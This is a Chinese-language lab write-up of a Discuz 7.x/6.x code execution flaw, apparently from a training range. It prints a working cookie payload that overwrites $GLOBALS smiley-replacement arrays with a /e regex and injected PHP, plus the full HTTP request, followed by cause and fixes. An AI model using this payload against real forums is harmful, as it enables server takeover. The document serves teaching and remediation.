# Discuz 7.x/6.x 全局变量防御绕过导致代码执行

> [English Documentation](README_EN.md)

| 属性 | 详情 |
|------|------|
| **漏洞名称** | Discuz 7.x/6.x 全局变量防御绕过导致代码执行 |
| **影响组件** | Discuz! Forum |
| **漏洞类型** | 代码执行 |
| **危险等级** | 🔴 高危 |
| **默认端口** | 8080 |

## 漏洞描述

`Discuz` 是流行的中文论坛软件系统之一，采用 `PHP+MySQL` 开发。

由于 php5.3.x 版本里 php.ini 的设置里 `request_order` 默认值为 GP，导致 `$_COOKIE`，我们通过在 Cookie 中传入 `$GLOBALS` 来覆盖全局变量，造成代码执行漏洞。

## 漏洞复现

### 环境信息

- 靶机 IP：192.168.2.47
- Web 端口：8080

### 操作步骤

**1. 安装 Discuz**

启动后，访问 `http://192.168.2.47:8080/install/` 来安装 discuz，数据库地址填写 `db`，数据库名为 `discuz`，数据库账号密码均为 `root`。

![安装页面](https://static.nextcyber.cn/attachments/images/course/task/3cbee4e141b44419b62abe6bb2fcd7d8.png)

**2. 发送恶意 Cookie**

安装成功后，直接找一个已存在的帖子，向其发送数据包，并在 `Cookie` 中增加：

```
GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();
```

发送的请求包：

```
GET /viewthread.php?tid=10&extra=page%3D1 HTTP/1.1
Host: 192.168.2.47:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Cookie: GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();
Connection: close
```

![发送请求](https://static.nextcyber.cn/attachments/images/course/task/5ae1598102d2442991ef1d52b6f881c7.png)

可见，`phpinfo` 已成功执行。

## 漏洞原理

在 PHP 5.3.x 版本中，`request_order` 默认值为 "GP"，这意味着 `$_REQUEST` 不再自动包含 `$_COOKIE` 中的变量。然而，Discuz 在某些处理流程中直接使用 `$GLOBALS` 全局变量，攻击者可以通过在 Cookie 中传入 `GLOBALS[_DCACHE][smilies][searcharray]` 和 `GLOBALS[_DCACHE][smilies][replacearray]` 来覆盖程序中的变量。当程序使用这些被污染的变量进行正则替换时，传入的 `replacearray` 会被作为 PHP 代码执行，从而导致代码执行漏洞。

## 修复建议

1. 升级到 PHP 5.3.x 以上版本并正确配置 `request_order`
2. 避免使用 `$GLOBALS` 全局变量
3. 对用户输入进行严格的过滤和验证
4. 使用白名单机制限制可执行的代码


---

## 靶场练习

前往 [NextCyber 靶场](https://app.nextcyber.cn/courses/60) 在线实战演练此漏洞。
